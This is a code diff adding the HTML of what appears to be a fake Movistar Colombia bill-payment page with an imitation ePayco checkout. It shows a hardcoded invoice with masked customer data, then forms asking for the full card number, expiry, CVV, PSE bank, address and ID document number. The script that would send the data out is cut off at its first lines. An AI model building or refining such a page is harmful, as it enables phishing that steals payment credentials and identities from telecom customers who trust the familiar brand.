+  <div id="form-view" class="view-panel active">
+    
+    <div class="tabs-wrapper">
+      <div class="tabs-container">
+        <button class="tab-btn active" data-brand="Movistar" onclick="setTab(this)">Movistar</button>
+        <button class="tab-btn" data-brand="Telebucaramanga" onclick="setTab(this)">Antes Telebucaramanga</button>
+        <button class="tab-btn" data-brand="Metrotel" onclick="setTab(this)">Antes Metrotel</button>
+      </div>
+    </div>
+
+    <div class="title">Pagar mi factura <strong id="brand-name">Movistar</strong></div>
+
+    <div class="toggle-group">
+      <button class="toggle-btn active" onclick="setToggle(this)">Móvil</button>
+      <button class="toggle-btn" onclick="setToggle(this)">Fija</button>
+    </div>
+
+    <button class="auto-pay">
+      <svg viewBox="0 0 24 24"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Activar/Gestionar mi pago automático
+    </button>
+
+    <div class="input-wrapper">
+      <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+      <input id="numero-linea" type="tel" inputmode="numeric" placeholder="Ingresa el número de línea o de pago" oninput="checkInput()" onkeypress="handleEnter(event)" autocomplete="off" />
+    </div>
+
+    <button class="btn-submit" id="btn-consultar" onclick="consultarDeuda()" disabled>Consultar y pagar</button>
+
+    <div class="bottom-info">
+      <div class="bottom-info-title"><strong>Nuevos medios de pago</strong> disponibles para ti</div>
+      <div class="logos-row">
+        <img src="img/descarga.jpg" alt="Credito Facil Codensa" class="codensa" />
+        <img src="img/descarga (1).jpg" alt="DaviPlata" class="daviplata" />
+        <img src="img/descarga (2).jpg" alt="Nequi" class="nequi" />
+        <img src="img/descarga.png" alt="RappiPay" class="rappipay" />
+      </div>
+      <div class="disclaimer">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+        <span>No se aceptan pagos con tarjetas de crédito Internacionales</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- VISTA DE FACTURA ENCONTRADA -->
+  <div id="invoice-view" class="view-panel">
+    <div class="invoice-top-card">
+      <img src="img/total.1773862663813 copy.svg" alt="Dispositivos" onerror="this.src='img/descarga.png'" />
+      <div class="invoice-user-info">
+        <div class="ga">GA*** FE***</div>
+        <div>Número de línea</div>
+        <div style="font-size:16px; color:#0b2739; font-weight:600;" id="inv-phone">3******092</div>
+        <div class="ref">Referencia de pago 607*****54</div>
+      </div>
+    </div>
+
+    <div class="invoice-title">Información de tu factura</div>
+    <div class="invoice-subtitle">Factura No.BE**********14</div>
+
+    <button class="btn-add-other" onclick="volver()">Agregar otro número de línea u otra referencia de pago</button>
+
+    <div class="debt-container">
+      <div class="debt-row" onclick="toggleDebtDetails()">
+        <div class="debt-left">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="2" fill="none"></path></svg>
+          <div>
+            <div class="num" id="inv-phone2">3** *** *092</div>
+            <div class="lbl">No. de consulta</div>
+          </div>
+        </div>
+        <div class="debt-right">
+          <div class="debt-right-texts">
+            <div class="amount" id="inv-amount">$156,383</div>
+            <div class="lbl">Total a pagar</div>
+          </div>
+          <div class="debt-caret" id="debt-caret">
+            <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
+          </div>
+        </div>
+      </div>
+
+      <div class="debt-details" id="debt-details">
+         <div class="dd-header">
+           <div>
+             <div class="dd-item-title" id="inv-phone3">3** *** *092</div>
+             <div class="dd-item-val">Número de línea</div>
+           </div>
+           <div style="text-align:right;">
+             <div class="dd-item-title">BE****14</div>
+             <div class="dd-item-val">Referencia de pago</div>
+           </div>
+         </div>
+         <div class="dd-table-header">
+           <span>Discriminado</span>
+           <span>Valor</span>
+         </div>
+         <div class="dd-row">
+           <div class="dd-row-left">
+             <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#00a9e0"></circle><path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="2" fill="none"></path></svg>
+             Servicio
+           </div>
+           <div class="dd-row-right active">
+             <span id="inv-amount-service">$156,383</span>
+             <svg class="icon-edit" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+           </div>
+         </div>
+         <div class="dd-row">
+           <div class="dd-row-left">
+             <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#d5d5d5" stroke-width="1" fill="none"></circle></svg>
+             Equipo a cuotas
+           </div>
+           <div class="dd-row-right">
+             <span>$0</span>
+             <svg class="icon-edit disabled" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+           </div>
+         </div>
+         <div class="dd-row">
+           <div class="dd-row-left">
+             <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#d5d5d5" stroke-width="1" fill="none"></circle></svg>
+             Contenidos Adicionales
+           </div>
+           <div class="dd-row-right">
+             <span>$0</span>
+             <svg class="icon-edit disabled" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+           </div>
+         </div>
+      </div>
+    </div>
+
+    <div class="action-buttons">
+      <button class="btn-cancel" onclick="volver()">Cancelar</button>
+      <button class="btn-pay" onclick="iniciarPago()">Pagar</button>
+    </div>
+
+    <div class="info-box">
+      Envía <strong>FACTURA</strong> como mensaje de texto al 85202 desde tu línea móvil <strong>Movistar</strong> y conoce el <strong>detalle de tu pago.</strong>
+    </div>
+
+    <div class="cards-row">
+       <img src="img/descarga (1).png" alt="Visa, Diners, Mastercard, Amex" style="height: 30px; object-fit: contain;" />
+    </div>
+    
+    <div class="footer-epayco">
+      <span>Pagos procesados por</span>
+      <img src="img/logo_ePayco.1773862663813.png" alt="ePayco" />
+    </div>
+
+  </div>
+
+</div>
+
+<!-- EPAYCO MODAL -->
+<div id="epayco-modal">
+  <div class="epayco-card">
+    
+    <!-- STEP 1: CONTACTO -->
+    <div id="epayco-step-1">
+      <div class="epayco-top">
+        <div class="epayco-close" onclick="cerrarEpayco()">
+          <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+        </div>
+        <div class="epayco-lang">ES <svg style="display:inline; width:10px; fill:#fff;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+        
+        <div class="epayco-logo-box">
+          <img src="img/logo.png" alt="Movistar">
+        </div>
+        <div class="epayco-company">
+          COLOMBIA TELECOMUNICACIONES S.A. E.S.P 
+          <svg style="width:14px; fill:#00a9e0;" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><path d="M11 7h2v2h-2zm0 4h2v6h-2z" fill="#fff"></path></svg>
+        </div>
+        <div class="epayco-desc">Pago multiples facturas Movistar</div>
+        
+        <div class="epayco-total-lbl">Total:</div>
+        <div class="epayco-total" id="epayco-total-amount">$0 COP</div>
+        
+        <div class="epayco-sec">
+          <svg viewBox="0 0 24 24" style="width:12px; fill:#5CB615;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg> 
+          Secured by <img src="img/logo_ePayco.1773862663813.png" alt="ePayco">
+        </div>
+      </div>
+      
+      <div class="epayco-bottom">
+        <div class="epayco-contact-title">
+          <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+          Detalles de contacto
+        </div>
+        
+        <div class="epayco-inputs-row">
+          <div class="epayco-input-group w-code">
+            <label>Código</label>
+            <div class="select-wrap">
+              <div style="display:flex; align-items:center;">
+                <img src="https://flagcdn.com/w40/co.png" alt="CO">
+                <span style="font-size:15px; color:#0b2739; font-weight:500;">+57</span>
+              </div>
+              <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
+            </div>
+          </div>
+          
+          <div class="epayco-input-group w-phone" id="grp-phone">
+            <label>Número de móvil</label>
+            <input type="tel" id="epayco-phone" class="epayco-input" placeholder="Ingresa tu número telefónico" oninput="validarEpaycoForm()">
+          </div>
+        </div>
+        
+        <div class="epayco-input-group" id="grp-email" style="margin-bottom: 5px;">
+          <label>Correo</label>
+          <input type="email" id="epayco-email" class="epayco-input" placeholder="" oninput="validarEpaycoForm()">
+        </div>
+        
+        <button class="epayco-btn" id="epayco-submit" onclick="continuarEpayco()">Continuar</button>
+      </div>
+    </div> <!-- FIN STEP 1 -->
+
+    <!-- STEP 2: METODOS DE PAGO -->
+    <div id="epayco-step-2">
+      <div class="epayco-top-small">
+        <div class="epayco-small-left">
+          <div class="epayco-small-logo"><img src="img/logo.png" alt="Movistar"></div>
+          <div class="epayco-small-texts">
+             <div class="epayco-small-title">COLOMBIA TELECOMUN... <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><path d="M11 7h2v2h-2zm0 4h2v6h-2z" fill="#fff"></path></svg></div>
+             <div class="epayco-small-desc">Pago multiples factu...</div>
+          </div>
+        </div>
+        <div class="epayco-small-right">
+          <div class="epayco-small-close" onclick="cerrarEpayco()"><svg viewBox="0 0 24 24" width="20" height="20" stroke="#fff" stroke-width="2" fill="none"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></div>
+          <div class="epayco-small-lang">ES <svg style="display:inline; width:8px; fill:#fff;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+        </div>
+      </div>
+
+      <div class="epayco-user-bar">
+        <div><strong>Mis datos:</strong> <span class="mail" id="mask-email">clo****@gmail.com</span></div>
+        <div class="epayco-edit-btn" onclick="editarMisDatos()">
+          <svg viewBox="0 0 24 24" stroke="currentColor"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+          Editar mis datos
+        </div>
+      </div>
+
+      <div class="epayco-methods">
+        <h3>Tarjetas, PSE, Efectivo & Más</h3>
+        
+        <div class="epayco-method-btn" onclick="irMetodo('daviplata')">
+          <div class="epayco-m-icon"><img src="img/descarga (1).jpg" alt="DaviPlata" style="border-radius:50%; border:1px solid #dcdcdc; padding:2px;"></div>
+          <div class="epayco-m-texts">
+            <div class="epayco-m-title">DaviPlata</div>
+            <div class="epayco-m-desc">Paga con tu saldo DaviPlata.</div>
+          </div>
+        </div>
+        
+        <div class="epayco-method-btn" onclick="irMetodo('tarjeta')">
+          <div class="epayco-m-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#1a1b1c" stroke-width="1.5"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line><line x1="6" y1="15" x2="10" y2="15"></line><line x1="14" y1="15" x2="18" y2="15"></line></svg></div>
+          <div class="epayco-m-texts">
+            <div class="epayco-m-title">Tarjeta Crédito y Débito</div>
+            <div class="epayco-m-desc">Visa, MasterCard, Amex, Diners y Codensa.</div>
+          </div>
+        </div>
+
+        <div class="epayco-method-btn" onclick="irMetodo('pse')">
+          <div class="epayco-m-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#1a1b1c" stroke-width="1.5"><polygon points="12 2 2 7 22 7 12 2"></polygon><line x1="2" y1="22" x2="22" y2="22"></line><line x1="4" y1="9" x2="4" y2="19"></line><line x1="8" y1="9" x2="8" y2="19"></line><line x1="12" y1="9" x2="12" y2="19"></line><line x1="16" y1="9" x2="16" y2="19"></line><line x1="20" y1="9" x2="20" y2="19"></line></svg></div>
+          <div class="epayco-m-texts">
+            <div class="epayco-m-title">PSE <img src="img/PSE-no-border-CxeRTxPO.svg" style="margin-left:5px; height:22px; border-radius:50%;"></div>
+            <div class="epayco-m-desc">
+              Cuentas de ahorro y/o corriente. <br>Acepta: <img src="img/daviplata-new-DWvRidHz.svg" style="height:12px; margin-right:4px;"> <img src="img/descarga (2).jpg" alt="Nequi" style="height:10px;"> & Más.
+            </div>
+          </div>
+        </div>
+
+        <div class="epayco-method-btn" onclick="irMetodo('bancolombia')">
+          <div class="epayco-m-icon" style="width:40px; height:40px;"><img src="img/Bancolombia-B5OhUQPe.svg" alt="Bancolombia" style="width:100%; height:100%; object-fit:contain;"></div>
+          <div class="epayco-m-texts" style="justify-content:center;">
+            <div class="epayco-m-title" style="font-size:16.5px;">Bancolombia</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="epayco-footer">
+        <div class="epayco-f-left">
+          <div class="epayco-f-total" id="epayco-total-bottom">$0 COP</div>
+          <div class="epayco-f-link">Ver detalle</div>
+        </div>
+        <div class="epayco-f-right">
+          Secured by <img src="img/logo_ePayco.1773862663813.png" alt="ePayco">
+        </div>
+      </div>
+    </div> <!-- FIN STEP 2 -->
+
+    <!-- STEP TARJETA: Formulario Tarjeta Crédito/Débito -->
+    <div id="epayco-step-tarjeta">
+      <div class="pse-top-bar">
+        <div class="pse-back-btn" onclick="volverDesdeTC()">
+          <svg viewBox="0 0 24 24" width="16" height="16" stroke="#fff" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+        </div>
+        <div class="epayco-small-logo" style="width:38px;height:38px;"><img src="img/logo.png" alt="Movistar"></div>
+        <div style="flex:1;overflow:hidden;">
+          <div class="epayco-small-title" style="font-size:13.5px;">COLOMBIA TELECOMUN...
+            <svg viewBox="0 0 24 24" style="width:12px;fill:#00a9e0;flex-shrink:0;"><circle cx="12" cy="12" r="10"></circle><path d="M11 7h2v2h-2zm0 4h2v6h-2z" fill="#fff"></path></svg>
+          </div>
+          <div class="epayco-small-desc" style="font-size:12px;">Pago multiples factu...</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;">
+          <div onclick="cerrarEpayco()" style="cursor:pointer;"><svg viewBox="0 0 24 24" width="18" height="18" stroke="#fff" stroke-width="2" fill="none"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></div>
+          <div class="epayco-small-lang">ES <svg style="display:inline;width:8px;fill:#fff;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+        </div>
+      </div>
+
+      <div class="epayco-user-bar">
+        <div><strong>Mis datos:</strong> <span class="mail" id="mask-email-tc">clo****@gmail.com</span></div>
+        <div class="epayco-edit-btn" onclick="volverDesdeTC()">
+          <svg viewBox="0 0 24 24" stroke="currentColor"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+          Editar mis datos
+        </div>
+      </div>
+
+      <div class="tc-scroll">
+        <div class="tc-label">
+          <svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line><line x1="6" y1="15" x2="10" y2="15"></line><line x1="14" y1="15" x2="18" y2="15"></line></svg>
+          Tarjeta Crédito y Débito <span>(Paso 1 de 2)</span>
+        </div>
+
+        <!-- Campo Nombre -->
+        <div class="tc-field">
+          <label>Nombre y Apellidos</label>
+          <input type="text" class="tc-input" id="tc-nombre" placeholder="Escribe..." oninput="actualizarTarjeta()" autocomplete="cc-name">
+        </div>
+
+        <!-- Campo Número tarjeta -->
+        <div class="tc-field">
+          <label>Número de tarjeta</label>
+          <input type="tel" class="tc-input" id="tc-numero" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatearTarjeta(this); actualizarTarjeta()" autocomplete="cc-number">
+        </div>
+
+        <!-- Fecha, CVV, Cuotas -->
+        <div class="tc-row">
+          <div class="tc-field">
+            <label>Expiración</label>
+            <input type="tel" class="tc-input" id="tc-fecha" placeholder="MM/AA" maxlength="5" oninput="formatearFecha(this); actualizarTarjeta()" autocomplete="cc-exp">
+          </div>
+          <div class="tc-field tc-cvv-wrap">
+            <label>CVV</label>
+            <input type="password" class="tc-input" id="tc-cvv" placeholder="..." maxlength="4" oninput="actualizarTarjeta()" autocomplete="cc-csc" style="padding-right:38px;">
+            <span class="tc-cvv-eye" onclick="toggleCVV()">
+              <svg id="tc-eye-icon" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+            </span>
+          </div>
+          <div class="tc-field cuotas">
+            <label>Cuotas</label>
+            <select class="tc-select" id="tc-cuotas">
+              <option>1</option><option>2</option><option>3</option><option>4</option>
+              <option>6</option><option>12</option><option>24</option><option>36</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Preview tarjeta -->
+        <div class="tc-card-preview">
+          <div class="tc-card-chip"></div>
+          <div class="tc-card-number" id="tc-preview-num">XXXX XXXX XXXX XXXX</div>
+          <div class="tc-card-bottom">
+            <div>
+              <div class="tc-card-name-lbl">Nombre y apellidos</div>
+              <div class="tc-card-name" id="tc-preview-name">NOMBRE Y APELLIDOS</div>
+            </div>
+            <div>
+              <div class="tc-card-exp-lbl">Fecha expiración</div>
+              <div class="tc-card-exp" id="tc-preview-exp">MM/AA</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="pse-pagar-footer">
+        <div class="pse-pagar-f-left">
+          <div class="pse-pagar-total" id="tc-total">$0 COP</div>
+          <div class="pse-pagar-link">Ver detalle</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
+          <div style="display:flex;align-items:center;gap:8px;">
+            <span style="font-size:15px;font-weight:700;color:#1a1b1c;">Continuar</span>
+            <div class="pse-continuar-btn" id="tc-continuar-btn" onclick="enviarTarjeta()" style="width:38px;height:38px;">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </div>
+          </div>
+          <div class="pse-pagar-secured">Secured by <img src="img/logo_ePayco.1773862663813.png" alt="ePayco"></div>
+        </div>
+      </div>
+    </div> <!-- FIN STEP TARJETA -->
+
+    <!-- STEP 3: PSE - SELECCIÓN DE BANCO -->
+    <div id="epayco-step-3">
+      <div class="pse-top-bar">
+        <div class="pse-back-btn" onclick="volverDesdePS()">
+          <svg viewBox="0 0 24 24" width="16" height="16" stroke="#fff" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="15 18 9 12 15 6"></polyline>
+          </svg>
+        </div>
+        <div class="epayco-small-logo" style="width:38px;height:38px;">
+          <img src="img/logo.png" alt="Movistar">
+        </div>
+        <div style="flex:1; overflow:hidden;">
+          <div class="epayco-small-title" style="font-size:13.5px;">COLOMBIA TELECOMUN...
+            <svg viewBox="0 0 24 24" style="width:12px; fill:#00a9e0; flex-shrink:0;"><circle cx="12" cy="12" r="10"></circle><path d="M11 7h2v2h-2zm0 4h2v6h-2z" fill="#fff"></path></svg>
+          </div>
+          <div class="epayco-small-desc" style="font-size:12px;">Pago multiples factu...</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;">
+          <div onclick="cerrarEpayco()" style="cursor:pointer;">
+            <svg viewBox="0 0 24 24" width="18" height="18" stroke="#fff" stroke-width="2" fill="none"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+          </div>
+          <div class="epayco-small-lang">ES <svg style="display:inline;width:8px;fill:#fff;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+        </div>
+      </div>
+
+      <div class="epayco-user-bar">
+        <div><strong>Mis datos:</strong> <span class="mail" id="mask-email-pse">clo****@gmail.com</span></div>
+        <div class="epayco-edit-btn" onclick="volverDesdePS()">
+          <svg viewBox="0 0 24 24" stroke="currentColor"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+          Editar mis datos
+        </div>
+      </div>
+
+      <div style="flex:1; overflow-y:auto; position:relative;">
+
+        <!-- PSE Step label -->
+        <div class="pse-step-label">
+          <img src="img/PSE-no-border-CxeRTxPO.svg" alt="PSE">
+          PSE <span>(Paso 1 de 2)</span>
+        </div>
+
+        <div class="pse-bank-label">Selecciona banco</div>
+
+        <!-- Grid de 6 bancos principales (original) -->
+        <div class="pse-banks-grid">
+          <div class="pse-bank-card" onclick="seleccionarBanco('Davivienda', this, 'davivienda')">
+            <img src="img/Davivienda-Y-orluIQ.svg" alt="Davivienda">
+            <span>Davivienda</span>
+          </div>
+          <div class="pse-bank-card" onclick="seleccionarBanco('DaviPlata', this, 'daviplata')">
+            <img src="img/daviplata-new-DWvRidHz.svg" alt="DaviPlata">
+            <span>DaviPlata</span>
+          </div>
+          <div class="pse-bank-card" onclick="seleccionarBanco('Bancolombia', this, 'bancolombia')">
+            <img src="img/Bancolombia-B5OhUQPe.svg" alt="Bancolombia">
+            <span>Bancolombia</span>
+          </div>
+          <div class="pse-bank-card" onclick="seleccionarBanco('BBVA', this, 'bbva')">
+            <img src="img/Bbva-BigwXMDA.svg" alt="BBVA">
+            <span>BBVA</span>
+          </div>
+          <div class="pse-bank-card" onclick="seleccionarBanco('Bogotá', this, 'bogota')">
+            <img src="img/descarga (1).jpg" alt="Bogotá" style="height:42px;width:42px;object-fit:contain;border-radius:50%;">
+            <span>Bogotá</span>
+          </div>
+          <div class="pse-bank-card" onclick="seleccionarBanco('Occidente', this, 'occidente')">
+            <img src="img/descarga.svg" alt="Occidente" style="height:42px;object-fit:contain;">
+            <span>Occidente</span>
+          </div>
+        </div>
+
+        <!-- Dropdown otro banco -->
+        <div class="pse-other-bank-wrap">
+          <span class="pse-other-bank-label">Seleccionar otro banco</span>
+          <div class="pse-other-bank-select" id="pse-dropdown-trigger" onclick="abrirPanelBancos()">
+            <span id="pse-dropdown-text">Selecciona...</span>
+            <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
+          </div>
+        </div>
+
+        <!-- Panel flotante de selección de banco -->
+        <div id="pse-bank-panel">
+          <div class="pse-panel-top">
+            <div class="pse-panel-back" onclick="cerrarPanelBancos()">
+              <svg viewBox="0 0 24 24" width="16" height="16" stroke="#fff" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="15 18 9 12 15 6"></polyline>
+              </svg>
+            </div>
+            <span class="pse-panel-title">Seleccionar banco</span>
+          </div>
+          <div class="pse-search-bar">
+            <svg viewBox="0 0 24 24"><path d="M21 21l-4.35-4.35M17 11A6 6 0 111 11a6 6 0 0116 0z" fill="none" stroke="#a0aab5" stroke-width="2" stroke-linecap="round"></path></svg>
+            <input type="text" id="pse-search-input" placeholder="Buscar..." oninput="filtrarBancos()" autocomplete="off">
+          </div>
+          <div class="pse-bank-list" id="pse-bank-list"></div>
+        </div>
+
+      </div>
+
+      <!-- Footer PSE Paso 1 -->
+      <div class="pse-footer">
+        <div class="pse-f-left">
+          <div class="pse-f-total" id="pse-total-amount">$0 COP</div>
+          <div class="pse-f-link">Ver detalle</div>
+        </div>
+        <div style="display:flex; flex-direction:column; align-items:flex-end; gap:6px; padding-bottom:8px;">
+          <div style="display:flex; align-items:center; gap:10px;">
+            <span style="font-size:15px; font-weight:700; color:#1a1b1c;">Continuar</span>
+            <div class="pse-continuar-btn" id="pse-continuar-btn" onclick="continuarPSE()">
+              <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </div>
+          </div>
+          <div style="font-size:11px; font-style:italic; display:flex; align-items:center; gap:4px; color:#727e8a;">
+            Secured by <img src="img/logo_ePayco.1773862663813.png" alt="ePayco" style="height:14px;">
+          </div>
+        </div>
+      </div>
+    </div> <!-- FIN STEP 3 PSE -->
+
+    <!-- STEP 4: PSE - FORMULARIO (Paso 2 de 2) -->
+    <div id="epayco-step-4">
+      <!-- Header igual al step 3 -->
+      <div class="pse-top-bar">
+        <div class="pse-back-btn" onclick="volverAlPaso1PSE()">
+          <svg viewBox="0 0 24 24" width="16" height="16" stroke="#fff" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="15 18 9 12 15 6"></polyline>
+          </svg>
+        </div>
+        <div class="epayco-small-logo" style="width:38px;height:38px;">
+          <img src="img/logo.png" alt="Movistar">
+        </div>
+        <div style="flex:1; overflow:hidden;">
+          <div class="epayco-small-title" style="font-size:13.5px;">COLOMBIA TELECOMUN...
+            <svg viewBox="0 0 24 24" style="width:12px; fill:#00a9e0; flex-shrink:0;"><circle cx="12" cy="12" r="10"></circle><path d="M11 7h2v2h-2zm0 4h2v6h-2z" fill="#fff"></path></svg>
+          </div>
+          <div class="epayco-small-desc" style="font-size:12px;">Pago multiples factu...</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;">
+          <div onclick="cerrarEpayco()" style="cursor:pointer;">
+            <svg viewBox="0 0 24 24" width="18" height="18" stroke="#fff" stroke-width="2" fill="none"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+          </div>
+          <div class="epayco-small-lang">ES <svg style="display:inline;width:8px;fill:#fff;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+        </div>
+      </div>
+
+      <div class="epayco-user-bar">
+        <div><strong>Mis datos:</strong> <span class="mail" id="mask-email-pse4">clo****@gmail.com</span></div>
+        <div class="epayco-edit-btn" onclick="volverAlPaso1PSE()">
+          <svg viewBox="0 0 24 24" stroke="currentColor"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+          Editar mis datos
+        </div>
+      </div>
+
+      <div class="pse-s4-scroll">
+        <div class="pse-step-label" style="padding-left:0; padding-right:0;">
+          <img src="img/PSE-no-border-CxeRTxPO.svg" alt="PSE">
+          PSE: <span id="pse-step4-banco" style="color:#1a1b1c; font-weight:700;">Bancolombia</span> <span>(Paso 2 de 2)</span>
+        </div>
+
+        <!-- Tipo persona -->
+        <div class="pse-person-toggle" id="pse-person-toggle">
+          <div class="pse-person-btn active" id="btn-natural" onclick="selPersona('natural')">
+            <svg viewBox="0 0 9 9"></svg>
+            Persona Natural
+          </div>
+          <div class="pse-person-btn" id="btn-juridica" onclick="selPersona('juridica')">
+            <svg viewBox="0 0 9 9"></svg>
+            Persona Jurídica
+          </div>
+        </div>
+
+        <!-- Nombre -->
+        <div class="pse-field-group">
+          <label>Nombre y Apellidos</label>
+          <input type="text" class="pse-field-input" id="pse-nombre" placeholder="Escribe..." oninput="validarFormPSE()">
+        </div>
+
+        <!-- Dirección -->
+        <div class="pse-field-group">
+          <label>Dirección</label>
+          <input type="text" class="pse-field-input" id="pse-direccion" placeholder="Escribe..." oninput="validarFormPSE()">
+        </div>
+
+        <!-- Documento -->
+        <div class="pse-doc-row">
+          <div class="pse-doc-select-wrap">
+            <label>Documento</label>
+            <select class="pse-doc-select" id="pse-tipo-doc">
+              <option value="CC">CC</option>
+              <option value="CE">CE</option>
+              <option value="NIT">NIT</option>
+              <option value="PP">PP</option>
+            </select>
+          </div>
+          <div class="pse-doc-num" style="flex:1; position:relative;">
+            <input type="tel" class="pse-field-input" id="pse-num-doc" placeholder="Número de documento" oninput="validarFormPSE()" style="border-color:#e5433a;">
+          </div>
+        </div>
+
+        <!-- T&C -->
+        <div class="pse-terms">
+          <div class="pse-terms-check" id="pse-terms-check" onclick="toggleTerms()">
+            <svg viewBox="0 0 12 10" width="10" height="10" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><polyline points="1,5 4,9 11,1"></polyline></svg>
+          </div>
+          <span>Confirmo y acepto los <a href="#">Términos y Condiciones</a> y la <a href="#">Política de Tratamiento de datos personales</a> de ePayco.</span>
+        </div>
+      </div>
+
+      <!-- Footer Paso 2 -->
+      <div class="pse-pagar-footer">
+        <div class="pse-pagar-f-left">
+          <div class="pse-pagar-total" id="pse4-total">$0 COP</div>
+          <div class="pse-pagar-link">Ver detalle</div>
+        </div>
+        <div style="display:flex; flex-direction:column; align-items:flex-end; gap:8px;">
+          <button class="pse-pagar-btn" id="pse-pagar-btn" onclick="pagarPSE()">Pagar</button>
+          <div class="pse-pagar-secured">Secured by <img src="img/logo_ePayco.1773862663813.png" alt="ePayco"></div>
+        </div>
+      </div>
+    </div> <!-- FIN STEP 4 PSE -->
+
+  </div>
+</div>
+
+<script>
+  let currentSessionId = null; // ID único para el flujo unificado
+
+  function setTab(btn) {
